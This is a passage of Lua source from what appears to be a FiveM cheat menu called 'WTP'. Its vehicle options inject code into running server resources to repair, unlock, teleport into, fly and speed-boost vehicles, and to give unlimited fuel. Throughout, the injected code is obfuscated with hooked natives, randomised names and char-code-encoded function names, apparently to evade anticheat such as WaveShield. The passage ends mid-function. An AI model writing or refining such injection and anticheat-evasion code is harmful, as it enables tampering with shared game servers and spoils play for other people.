                                        local vehicle = _g(_b("GetVehiclePedIsIn"))(ped, false)
                                        
                                        if vehicle and vehicle ~= 0 and _g(_b("DoesEntityExist"))(vehicle) then
                                            _g(_b("SetVehicleFixed"))(vehicle)
                                            _g(_b("SetVehicleDeformationFixed"))(vehicle)
                                            _g(_b("SetVehicleUndriveable"))(vehicle, false)
                                            _g(_b("SetVehicleEngineOn"))(vehicle, true, true, true)
                                            _g(_b("SetVehicleEngineHealth"))(vehicle, 1000.0)
                                            _g(_b("SetVehicleBodyHealth"))(vehicle, 1000.0)
                                            _g(_b("SetVehiclePetrolTankHealth"))(vehicle, 1000.0)
                                            _g(_b("SetVehicleFuelLevel"))(vehicle, 100.0)
                                        end
                                    ]])
                                end
                            end
                        },
                        { type = "button", label = "Clean Vehicle",
                            onSelect = function()
                                executeCode('any', [[
                                    local veh = GetVehiclePedIsUsing(PlayerPedId())
                                    if veh and veh ~= 0 then
                                        SetVehicleDirtLevel(veh, 0.0)
                                    end
                                ]])
                            end
                        },
                        { type = "button", label = "Force Vehicle Engine",
                            onSelect = function()
                            executeCode(GetResourceState("monitor") == "started" and "monitor" or GetResourceState("ox_lib") == "started" and "ox_lib" or "any", [[
                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehiclePedIsTryingToEnter", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleEngineOn", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleUndriveable", function(originalFn, ...) return originalFn(...) end)
                                hNative("IsPedInVehicle", function(originalFn, ...) return originalFn(...) end)
                                hNative("IsPedInVehicle", function(originalFn, ...) return false end)
                                hNative("SetVehicleEngineCanDegrade", function(originalFn, ...) return false end)
                                hNative("SetVehicleKeepEngineOnWhenAbandoned", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehicleEngineHealth", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleEngineHealth", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleEngineCanDegrade", function(originalFn, ...) return originalFn(...) end)
                                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                if GhYtReFdCxWaQzLp == nil then GhYtReFdCxWaQzLp = false end
                                GhYtReFdCxWaQzLp = true

                                local function OpAsDfGhJkLzXcVb()
                                    local lMnbVcXzZaSdFg = CreateThread
                                    lMnbVcXzZaSdFg(function()
                                        local QwErTyUiOp         = _G.PlayerPedId
                                        local AsDfGhJkLz         = _G.GetVehiclePedIsIn
                                        local TyUiOpAsDfGh       = _G.GetVehiclePedIsTryingToEnter
                                        local ZxCvBnMqWeRtYu     = _G.SetVehicleEngineOn
                                        local ErTyUiOpAsDfGh     = _G.SetVehicleUndriveable
                                        local KeEpOnAb           = _G.SetVehicleKeepEngineOnWhenAbandoned
                                        local En_g_Health_Get    = _G.GetVehicleEngineHealth
                                        local En_g_Health_Set    = _G.SetVehicleEngineHealth
                                        local En_g_Degrade_Set   = _G.SetVehicleEngineCanDegrade
                                        local No_Hotwire_Set     = _G.SetVehicleNeedsToBeHotwired

                                        local function _tick(vh)
                                            if vh and vh ~= 0 then
                                                No_Hotwire_Set(vh, false)
                                                En_g_Degrade_Set(vh, false)
                                                ErTyUiOpAsDfGh(vh, false)
                                                KeEpOnAb(vh, true)

                                                local eh = En_g_Health_Get(vh)
                                                if (not eh) or eh < 300.0 then
                                                    En_g_Health_Set(vh, 900.0)
                                                end

                                                ZxCvBnMqWeRtYu(vh, true, true, true)
                                            end
                                        end

                                        while GhYtReFdCxWaQzLp and not Unloaded do
                                            local p  = QwErTyUiOp()

                                            _tick(AsDfGhJkLz(p, false))
                                            _tick(TyUiOpAsDfGh(p))
                                            _tick(AsDfGhJkLz(p, true))

                                            Wait(0)
                                        end
                                    end)
                                end

                                OpAsDfGhJkLzXcVb()
                            ]])
                        end, function()
                            executeCode(GetResourceState("monitor") == "started" and "monitor" or GetResourceState("ox_lib") == "started" and "ox_lib" or "any", [[

                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehiclePedIsTryingToEnter", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleEngineOn", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleUndriveable", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleKeepEngineOnWhenAbandoned", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehicleEngineHealth", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleEngineHealth", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleEngineCanDegrade", function(originalFn, ...) return originalFn(...) end)
                                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                GhYtReFdCxWaQzLp = false
                                local v = GetVehiclePedIsIn(PlayerPedId(), false)
                                if v and v ~= 0 then
                                    SetVehicleKeepEngineOnWhenAbandoned(v, false)
                                    SetVehicleEngineCanDegrade(v, true)
                                    SetVehicleUndriveable(v, false)
                                end
                            ]])
                            end
                        },
                        { type = "button", label = "Delete Vehicle",
                            onSelect = function()
                                executeCode('any', [[
                                    local veh = GetVehiclePedIsUsing(PlayerPedId())
                                    if veh and veh ~= 0 then
                                        DeleteVehicle(veh)
                                    end
                                ]])
                            end
                        },
                        { type = "button", label = "Lock Closest Vehicle",
                            onSelect = function()
                                executeCode('any', [[
                                    local ped = PlayerPedId()
                                    local pos = GetEntityCoords(ped)
                                    local veh = GetClosestVehicle(pos.x, pos.y, pos.z, 5.0, 0, 70)
                                    if veh and DoesEntityExist(veh) then
                                        for i = 1, 2 do
                                            SetVehicleDoorsLockedForAllPlayers(veh, true)
                                            Wait(1)
                                        end
                                    end
                                ]])
                            end
                        },
                        { type = "button", label = "Unlock Closest Vehicle",
                            onSelect = function()
                                executeCode('any', [[
                                    local ped = PlayerPedId()
                                    local pos = GetEntityCoords(ped)
                                    local veh = GetClosestVehicle(pos.x, pos.y, pos.z, 5.0, 0, 70)
                                    if veh and DoesEntityExist(veh) then
                                        for i = 1, 2 do
                                            SetVehicleDoorsLockedForAllPlayers(veh, false)
                                            Wait(1)
                                        end
                                    end
                                ]])
                            end
                        },
                        { type = "button", label = "Teleport into Closest Vehicle",
                            onSelect = function()
                                WTP:Notify("success", "WTP", "Teleported into Vehicle", 3000)
                                MachoInjectResourceRaw(GetResourceState("monitor") == "started" and "monitor" or GetResourceState("ox_lib") == "started" and "ox_lib" or "any", [[
                                    function hNative(nativeName, newFunction)
                                        local originalNative = _G[nativeName]
                                        if not originalNative or type(originalNative) ~= "function" then
                                            return
                                        end

                                        _G[nativeName] = function(...)
                                            return newFunction(originalNative, ...)
                                        end
                                    end

                                    hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                    hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                    hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetClosestVehicle", function(originalFn, ...) return originalFn(...) end)
                                    hNative("SetVehicleForwardSpeed", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                                    hNative("IsPedInAnyVehicle", function(originalFn, ...) return originalFn(...) end)
                                    hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                                    hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                    local function uPKcoBaEHmnK()
                                        local ziCFzHyzxaLX = SetPedIntoVehicle
                                        local YPPvDlOGBghA = GetClosestVehicle

                                        local Coords = GetEntityCoords(PlayerPedId())
                                        local vehicle = YPPvDlOGBghA(Coords.x, Coords.y, Coords.z, 15.0, 0, 70)

                                        if DoesEntityExist(vehicle) and not IsPedInAnyVehicle(PlayerPedId(), false) then
                                            if GetPedInVehicleSeat(vehicle, -1) == 0 then
                                                ziCFzHyzxaLX(PlayerPedId(), vehicle, -1)
                                            else
                                                ziCFzHyzxaLX(PlayerPedId(), vehicle, 0)
                                            end
                                        end
                                    end

                                    uPKcoBaEHmnK()
                                ]])
                            end
                        },
                        { type = "button", label = "Remove All Doors",
                            onSelect = function()
                                MachoInjectResourceRaw("any", [[
                                    local playerPed = PlayerPedId()
                                    local vehicle = GetVehiclePedIsIn(playerPed, false)

                                    if vehicle == 0 then return end
                                    for i = 0, 3 do
                                        SetVehicleDoorBroken(vehicle, i, false)
                                    end

                                    SetVehicleDoorOpen(vehicle, 5, false, false)
                                ]])
                            end
                        },
                        { type = "divider", label = "Toggles" },
                        {
                            type = "checkbox",
                            label = "Force Engine On",
                            checked = false,
                            desc = "Keeps the vehicle engine running without hotwiring.",
                            onSelect = function(checked)
                                if checked then
                                    executeCode("any", [[
                                        _G.ForceEngineOnActive = true
                                        WTP.SafeRunNative(CreateThread, function()
                                            while _G.ForceEngineOnActive do
                                                local selfPed = PlayerPedId()
                                                local vehicle = GetVehiclePedIsIn(selfPed, false)

                                                if vehicle ~= 0 and GetPedInVehicleSeat(vehicle, -1) == selfPed then
                                                    WTP.SafeRunNative(SetVehicleEngineOn, vehicle, true, true, true)
                                                    WTP.SafeRunNative(SetVehicleUndriveable, vehicle, false)
                                                    WTP.SafeRunNative(SetVehicleNeedsToBeHotwired, vehicle, false)
                                                end

                                                Wait(0)
                                            end
                                        end)
                                    ]])
                                else
                                    executeCode("any", [[
                                        _G.ForceEngineOnActive = false
                                    ]])
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Disable Locks",
                            checked = false,
                            desc = "Unlocks all vehicles so you can enter any door.",
                            onSelect = function(checked)
                                if checked then
                                    executeCode("any", [[
                                        _G.DisableLocksActive = true
                                        WTP.SafeRunNative(CreateThread, function()
                                            while _G.DisableLocksActive do
                                                if IsControlPressed(0, 23) or IsDisabledControlPressed(0, 23) then
                                                    local selfPlayer = PlayerId()
                                                    local vehicles = GetGamePool('CVehicle')

                                                    for i = 1, #vehicles do
                                                        local entity = vehicles[i]

                                                        WTP.SafeRunNative(SetEntityAsMissionEntity, entity, true, true)
                                                        WTP.SafeRunNative(SetVehicleDoorsLocked, entity, 1)
                                                        WTP.SafeRunNative(SetVehicleDoorsLockedForPlayer, entity, selfPlayer, false)
                                                        WTP.SafeRunNative(SetVehicleDoorsLockedForAllPlayers, entity, false)
                                                        WTP.SafeRunNative(SetVehicleNeedsToBeHotwired, entity, false)
                                                        WTP.SafeRunNative(SetVehicleCanBeUsedByFleeingPeds, entity, true)
                                                        WTP.SafeRunNative(SetVehicleUndriveable, entity, false)

                                                        Wait(10)
                                                    end
                                                end

                                                Wait(100)
                                            end
                                        end)
                                    ]])
                                else
                                    executeCode("any", [[
                                        _G.DisableLocksActive = false
                                    ]])
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Hard Braking",
                            checked = false,
                            desc = "Stops your vehicle instantly when braking.",
                            onSelect = function(checked)
                                if checked then
                                    executeCode("any", [[
                                        _G.HardBrakingActive = true
                                        WTP.SafeRunNative(CreateThread, function()
                                            while _G.HardBrakingActive do
                                                if IsControlJustPressed(0, 31) then
                                                    local vehicle = GetVehiclePedIsIn(PlayerPedId(), false)

                                                    if vehicle and vehicle > 0 and DoesEntityExist(vehicle) then
                                                        WTP.SafeRunNative(SetEntityVelocity, vehicle, 0.0, 0.0, 0.0)
                                                    end
                                                end

                                                Wait(0)
                                            end
                                        end)
                                    ]])
                                else
                                    executeCode("any", [[
                                        _G.HardBrakingActive = false
                                    ]])
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "No Fall Off",
                            checked = false,
                            desc = "revents falling off bikes and similar vehicles.",
                            onSelect = function(checked)
                                if checked then
                                    executeCode("any", [[
                                        _G.NoFallOffActive = true
                                        WTP.SafeRunNative(CreateThread, function()
                                            while _G.NoFallOffActive do
                                                WTP.SafeRunNative(SetPedCanBeKnockedOffVehicle, PlayerPedId(), 1)
                                                Wait(1000)
                                            end
                                        end)
                                    ]])
                                else
                                    executeCode("any", [[
                                        _G.NoFallOffActive = false
                                        WTP.SafeRunNative(SetPedCanBeKnockedOffVehicle, PlayerPedId(), 0)
                                    ]])
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Vehicle Fly",
                            checked = false,
                            onSelect = function(checked)
                                if checked then
                                    WTP:Notify("success", "WTP", "Press [Y] Select a vehicle to control. | [G] Fly the vehicle. | [L] Freeze/unfreeze the vehicle", 3000)
                                    Control_Vehicle = true
                                    Control_Vehicle_Thread = CreateThread(function()
                                        while Control_Vehicle do
                                            Wait(0)
                                            if IsControlJustPressed(0, 182) then ToggleFreezeVehicle(selectedVehicle) end
                                            if IsControlJustPressed(0, 246) then
                                                if selectedVehicle and DoesEntityExist(selectedVehicle) then SetEntityDrawOutline(selectedVehicle, false) end
                                                selectedVehicle = GetClosestVehicle()
                                                if selectedVehicle then WTP:Notify("success", "WTP", "Successfully Selected Vehicle!", 3000) end
                                            end

                                            if selectedVehicle and DoesEntityExist(selectedVehicle) then
                                                DrawVehicleOutline(selectedVehicle)
                                                if IsControlPressed(0, 47) then
                                                    if not isVehicleFlying then isVehicleFlying = true SetEntityHasGravity(selectedVehicle, false) end
                                                    local camRot = GetGameplayCamRot(2)
                                                    local propulsionSpeed = 50.0
                                                    local dirX = -math.sin(math.rad(camRot.z)) * math.cos(math.rad(camRot.x))
                                                    local dirY = math.cos(math.rad(camRot.z)) * math.cos(math.rad(camRot.x))
                                                    local dirZ = math.sin(math.rad(camRot.x))
                                                    SetEntityVelocity(selectedVehicle, dirX * propulsionSpeed, dirY * propulsionSpeed, dirZ * propulsionSpeed)
                                                else
                                                    if isVehicleFlying then isVehicleFlying = false SetEntityHasGravity(selectedVehicle, true) end
                                                end
                                            end
                                        end
                                    end)
                                else
                                    WTP:Notify("error", "WTP", "Vehicle fly disabled.", 3000)
                                    Control_Vehicle = false
                                    if Control_Vehicle_Thread then
                                        TerminateThread(Control_Vehicle_Thread)
                                        Control_Vehicle_Thread = nil
                                    end
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Boost Vehicle",
                            checked = false,
                            onSelect = function(checked)
                                if checked then
                                    WTP:Notify("success", "WTP", "Boost Vehicle On", 3000)

                                    if GetResourceState("WaveShield") == "started" then
                                        executeCode(GetResourceState("WaveShield") == "started" and "WaveShield" or GetResourceState("ox_lib") == "started" and "ox_lib" or "any", [[
                                            local function decode(tbl)
                                                local s = ""
                                                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                                return s
                                            end

                                            local function g(n)
                                                return _G[decode(n)]
                                            end

                                            if not _G.superSpeedBoost then
                                                _G.superSpeedBoost = true

                                                local PlayerPedId_fn       = g({80,108,97,121,101,114,80,101,100,73,100})
                                                local GetVehiclePedIsIn_fn = g({71,101,116,86,101,104,105,99,108,101,80,101,100,73,115,73,110})
                                                local IsPedInAnyVehicle_fn = g({73,115,80,101,100,73,110,65,110,121,86,101,104,105,99,108,101})
                                                local IsControlPressed_fn  = g({73,115,67,111,110,116,114,111,108,80,114,101,115,115,101,100})
                                                local SetVehicleForwardSpeed_fn = g({83,101,116,86,101,104,105,99,108,101,70,111,114,119,97,114,100,83,112,101,101,100})
                                                local Wait_fn              = g({87,97,105,116})

                                                _G.superSpeedBoostEnabled = true

                                                local function initFlow(cb)
                                                    local co = coroutine.create(cb)
                                                    local function execCycle()
                                                        while coroutine.status(co) ~= "dead" do
                                                            local ok, err = coroutine.resume(co)
                                                            if not ok then
                                                                break
                                                            end
                                                            Wait_fn(0)
                                                        end
                                                    end
                                                    execCycle()
                                                end

                                                initFlow(function()
                                                    while _G.superSpeedBoostEnabled do
                                                        if not _G.superSpeedBoostEnabled then break end

                                                        local ped = PlayerPedId_fn()
                                                        if IsControlPressed_fn(0, 209) and IsPedInAnyVehicle_fn(ped, false) then
                                                            local veh = GetVehiclePedIsIn_fn(ped, false)
                                                            if veh and veh ~= 0 then
                                                                SetVehicleForwardSpeed_fn(veh, 100.0)
                                                            end
                                                        end

                                                        Wait_fn(0)
                                                    end
                                                end)
                                            end
                                        ]])
                                    else
                                        MachoInjectResourceRaw("any", [[
                                            if VkLpOiUyTrEq == nil then VkLpOiUyTrEq = false end
                                            if VbNmQwErTyUi == nil then
                                                VbNmQwErTyUi = true

                                                local function YgT7FrqXcN()
                                                    local ZxSeRtYhUiOp = CreateThread
                                                    local LkJhGfDsAzXv = PlayerPedId
                                                    local PoLkJhBgVfCd = GetVehiclePedIsIn
                                                    local ErTyUiOpAsDf = IsControlPressed
                                                    local GtHyJuKoLpMi = IsPedInAnyVehicle
                                                    local HnJmKlIoPuYt = SetVehicleForwardSpeed

                                                    ZxSeRtYhUiOp(function()
                                                        while true do
                                                            Wait(0)
                                                            if not VkLpOiUyTrEq then
                                                                Wait(500)
                                                                goto continue
                                                            end

                                                            local ped = LkJhGfDsAzXv()
                                                            if ErTyUiOpAsDf(0, 209) and GtHyJuKoLpMi(ped, false) then
                                                                local veh = PoLkJhBgVfCd(ped, false)
                                                                if veh and veh ~= 0 then
                                                                    HnJmKlIoPuYt(veh, 100.0)
                                                                end
                                                            end

                                                            ::continue::
                                                        end
                                                    end)
                                                end

                                                YgT7FrqXcN()
                                            end
                                            
                                            VkLpOiUyTrEq = true
                                        ]])
                                    end
                                else
                                    WTP:Notify("error", "WTP", "Boost Vehicle Off", 3000)

                                    if GetResourceState("WaveShield") == "started" then
                                        executeCode(GetResourceState("monitor") == "started" and "monitor" or GetResourceState("ox_lib") == "started" and "ox_lib" or "any", [[
                                            _G.superSpeedBoost = false
                                        ]])
                                    else
                                        executeCode("any", [[
                                            VkLpOiUyTrEq = false
                                        ]])
                                    end
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Rainbow Vehicle",
                            checked = false,
                            onSelect = function(checked)
                                local target = GetResourceState("monitor") == "started" and "monitor"
                                            or GetResourceState("ox_lib") == "started" and "ox_lib"
                                            or "any"
                                if checked then
                                    WTP:Notify("success", "WTP", "Rainbow Vehicle On", 3000)

                                    if GetResourceState("WaveShield") == "started" then
                                        print("souygdfg")
                                        executeCode(target, [[
                                            if not _G.WTPRainbow then
                                                _G.WTPRainbow = { enabled = false, originals = {}, thread = nil }
                                            end
                                            _G.WTPRainbow.enabled = true

                                            local function hNative(name, wrapper)
                                                local orig = _G[name]
                                                if not orig or type(orig) ~= "function" then return end
                                                if not _G.WTPRainbow.originals[name] then
                                                    _G.WTPRainbow.originals[name] = orig
                                                end
                                                _G[name] = function(...) return wrapper(orig, ...) end
                                            end

                                            hNative("Wait",                     function(o, ms) return o(ms) end)
                                            hNative("GetGameTimer",             function(o)    return o() end)
                                            hNative("math.floor",               function(o, x) return o(x) end)
                                            hNative("math.sin",                 function(o, x) return o(x) end)
                                            hNative("GetVehiclePedIsIn",        function(o, p, l) return o(p, l) end)
                                            hNative("DoesEntityExist",          function(o, e) return o(e) end)
                                            hNative("SetVehicleCustomPrimaryColour",   function(o, v, r, g, b) return o(v, r, g, b) end)
                                            hNative("SetVehicleCustomSecondaryColour", function(o, v, r, g, b) return o(v, r, g, b) end)
                                            hNative("PlayerPedId",              function(o)    return o() end)

                                            if not _G.WTPRainbow.thread then
                                                _G.WTPRainbow.thread = coroutine.create(function()
                                                    local freq = 1.0
                                                    local function getRainbowColor()
                                                        local t = GetGameTimer() / 1000
                                                        local r = math.floor(math.sin(t * freq + 0) * 127 + 128)
                                                        local g = math.floor(math.sin(t * freq + 2) * 127 + 128)
                                                        local b = math.floor(math.sin(t * freq + 4) * 127 + 128)
                                                        return r, g, b
                                                    end
                                                    while _G.WTPRainbow.enabled do
                                                        local ped = PlayerPedId()
                                                        local veh = GetVehiclePedIsIn(ped, false)
                                                        if veh and veh ~= 0 and DoesEntityExist(veh) then
                                                            local r, g, b = getRainbowColor()
                                                            SetVehicleCustomPrimaryColour(veh, r, g, b)
                                                            SetVehicleCustomSecondaryColour(veh, r, g, b)
                                                        end
                                                        Wait(0)
                                                    end
                                                end)

                                                while _G.WTPRainbow.enabled and coroutine.status(_G.WTPRainbow.thread) ~= "dead" do
                                                    coroutine.resume(_G.WTPRainbow.thread)
                                                    Citizen.Wait(0)
                                                end
                                            end
                                        ]])
                                    else
                                        executeCode(target, [[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(o, ...) return o(...) end)
                                            hNative("Wait",         function(o, ...) return o(...) end)
                                            hNative("GetGameTimer", function(o, ...) return o(...) end)
                                            hNative("math.floor",   function(o, ...) return o(...) end)
                                            hNative("math.sin",     function(o, ...) return o(...) end)
                                            hNative("GetVehiclePedIsIn", function(o, ...) return o(...) end)
                                            hNative("DoesEntityExist",   function(o, ...) return o(...) end)
                                            hNative("SetVehicleCustomSecondaryColour", function(o, ...) return o(...) end)
                                            hNative("SetVehicleCustomPrimaryColour",   function(o, ...) return o(...) end)
                                            hNative("PlayerPedId", function(o, ...) return o(...) end)

                                            if GxRpVuNzYiTq == nil then GxRpVuNzYiTq = false end
                                            GxRpVuNzYiTq = true

                                            local function jqX7TvYzWq()
                                                local WvBnMpLsQzTx = GetGameTimer
                                                local VcZoPwLsEkRn = math.floor
                                                local DfHkLtQwAzCx = math.sin
                                                local PlJoQwErTgYs = CreateThread
                                                local MzLxVoKsUyNz = GetVehiclePedIsIn
                                                local EyUiNkOpLtRg = PlayerPedId
                                                local KxFwEmTrZpYq = DoesEntityExist
                                                local UfBnDxCrQeTg = SetVehicleCustomPrimaryColour
                                                local BvNzMxLoPwEq = SetVehicleCustomSecondaryColour
                                                local yGfTzLkRn = 1.0

                                                local function HrCvWbXuNz(freq)
                                                    local color = {}
                                                    local t = WvBnMpLsQzTx() / 1000
                                                    color.r = VcZoPwLsEkRn(DfHkLtQwAzCx(t * freq + 0) * 127 + 128)
                                                    color.g = VcZoPwLsEkRn(DfHkLtQwAzCx(t * freq + 2) * 127 + 128)
                                                    color.b = VcZoPwLsEkRn(DfHkLtQwAzCx(t * freq + 4) * 127 + 128)
                                                    return color
                                                end

                                                PlJoQwErTgYs(function()
                                                    while GxRpVuNzYiTq and not Unloaded do
                                                        local ped = EyUiNkOpLtRg()
                                                        local veh = MzLxVoKsUyNz(ped, false)
                                                        if veh and veh ~= 0 and KxFwEmTrZpYq(veh) then
                                                            local rgb = HrCvWbXuNz(yGfTzLkRn)
                                                            UfBnDxCrQeTg(veh, rgb.r, rgb.g, rgb.b)
                                                            BvNzMxLoPwEq(veh, rgb.r, rgb.g, rgb.b)
                                                        end
                                                        Wait(0)
                                                    end
                                                end)
                                            end
                                            jqX7TvYzWq()
                                        ]])
                                    end
                                else
                                    WTP:Notify("error", "WTP", "Rainbow Vehicle Off", 3000)
                                    if GetResourceState("WaveShield") == "started" then
                                        print("swave")
                                        executeCode(target, [[
                                            if not _G.WTPRainbow then
                                                _G.WTPRainbow = { enabled = false, originals = {}, thread = nil }
                                            end
                                            _G.WTPRainbow.enabled = false

                                            for name, orig in pairs(_G.WTPRainbow.originals) do
                                                if _G[name] then _G[name] = orig end
                                            end

                                            if _G.WTPRainbow.thread and coroutine.status(_G.WTPRainbow.thread) ~= "dead" then
                                                coroutine.resume(_G.WTPRainbow.thread)
                                            end

                                            local co = coroutine.create(function()
                                                local ped = PlayerPedId()
                                                local veh = GetVehiclePedIsIn(ped, false)
                                                if veh and veh ~= 0 and DoesEntityExist(veh) then
                                                    SetVehicleCustomPrimaryColour(veh, 255, 255, 255)
                                                    SetVehicleCustomSecondaryColour(veh, 255, 255, 255)
                                                end
                                            end)
                                            while coroutine.status(co) ~= "dead" do
                                                coroutine.resume(co)
                                                Citizen.Wait(0)
                                            end
                                        ]])
                                    else
                                        executeCode(target, [[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(o, ...) return o(...) end)
                                            hNative("Wait",         function(o, ...) return o(...) end)
                                            hNative("GetGameTimer", function(o, ...) return o(...) end)
                                            hNative("math.floor",   function(o, ...) return o(...) end)
                                            hNative("math.sin",     function(o, ...) return o(...) end)
                                            hNative("GetVehiclePedIsIn", function(o, ...) return o(...) end)
                                            hNative("DoesEntityExist",   function(o, ...) return o(...) end)
                                            hNative("SetVehicleCustomSecondaryColour", function(o, ...) return o(...) end)
                                            hNative("SetVehicleCustomPrimaryColour",   function(o, ...) return o(...) end)
                                            hNative("PlayerPedId", function(o, ...) return o(...) end)

                                            GxRpVuNzYiTq = false
                                        ]])
                                    end
                                end
                            end,
                        },
                        { type = "checkbox", label = "Unlimited Fuel", checked = false,
                            onSelect = function(checked)
                                if checked then
                                    WTP:Notify("success", "WTP", "Unlimited Fuel On", 3000)
                                    executeCode(GetResourceState("monitor") == "started" and "monitor" or GetResourceState("ox_lib") == "started" and "ox_lib" or "any", [[
                                        function hNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then
                                                return
                                            end

                                            _G[nativeName] = function(...)
                                                return newFunction(originalNative, ...)
                                            end
                                        end

                                        hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                        hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                        hNative("IsPedInAnyVehicle", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                        hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetVehicleFuelLevel", function(originalFn, ...) return originalFn(...) end)
                                        hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                        if BlNkJmLzXcVb == nil then BlNkJmLzXcVb = false end
                                        BlNkJmLzXcVb = true

                                        local function LqWyXpR3tV()
                                            local TmPlKoMiJnBg = CreateThread
                                            local ZxCvBnMaSdFg = PlayerPedId
                                            local YhUjIkOlPlMn = IsPedInAnyVehicle
                                            local VcXzQwErTyUi = GetVehiclePedIsIn
                                            local KpLoMkNjBhGt = DoesEntityExist
                                            local JkLzXcVbNmAs = SetVehicleFuelLevel

                                            TmPlKoMiJnBg(function()
                                                while BlNkJmLzXcVb and not Unloaded do
                                                    local ped = ZxCvBnMaSdFg()
                                                    if YhUjIkOlPlMn(ped, false) then
                                                        local veh = VcXzQwErTyUi(ped, false)
                                                        if KpLoMkNjBhGt(veh) then
                                                            JkLzXcVbNmAs(veh, 100.0)
                                                        end
                                                    end
                                                    Wait(100)
                                                end
                                            end)
                                        end

                                        LqWyXpR3tV()
                                    ]])
                                else
                                    WTP:Notify("error", "WTP", "Unlimited Fuel Off", 3000)
                                    executeCode(GetResourceState("monitor") == "started" and "monitor" or GetResourceState("ox_lib") == "started" and "ox_lib" or "any", [[
                                        function hNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then
                                                return
                                            end

                                            _G[nativeName] = function(...)
                                                return newFunction(originalNative, ...)
                                            end
                                        end

                                        hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                        hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                        hNative("IsPedInAnyVehicle", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                        hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetVehicleFuelLevel", function(originalFn, ...) return originalFn(...) end)
                                        hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                        BlNkJmLzXcVb = false
                                    ]])
                                end
                            end
                        },
                        { type = "divider", label = "Vehicle Tricks" },
                        { icon = "", type = "scrollable", value = 1, values = { "Kick Flip", "Back Flip", "Jump", "Flip" }, label = "Vehicle Stunts", desc = "Applies physics stunts",
                            onSelect = function(value)
                                if value == "Kick Flip" then
                                    MachoInjectResource("any", [[
                                        local playerVeh = GetVehiclePedIsIn(PlayerPedId(), true)
                                                
                                        if DoesEntityExist(playerVeh) then
                                            ApplyForceToEntity(playerVeh, 1, 0.0, 0.0, 10.0, 90.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
                                        end
                                    ]])
                                elseif value == "Back Flip" then
                                    MachoInjectResource("any", [[
                                        local playerVeh = GetVehiclePedIsIn(PlayerPedId(), true)
                                                
                                        if DoesEntityExist(playerVeh) then
                                            ApplyForceToEntity(playerVeh, 1, 0.0, 0.0, 15.0, 0.0, 60.0, 0.0, 0, 0, 1, 1, 0, 0)
                                        end
                                    ]])
                                elseif value == "Jump" then
                                    MachoInjectResource("any", [[
                                        local playerVeh = GetVehiclePedIsIn(PlayerPedId(), true)
                                                
                                        if DoesEntityExist(playerVeh) then
                                            ApplyForceToEntity(playerVeh, 1, 0.0, 0.0, 15.0, 0.0, 0.0, 00.0, 0, 1, 0, 1, 0, 0)
                                        end
                                    ]])
                                elseif value == "Flip" then
                                    MachoInjectResourceRaw("any", [[
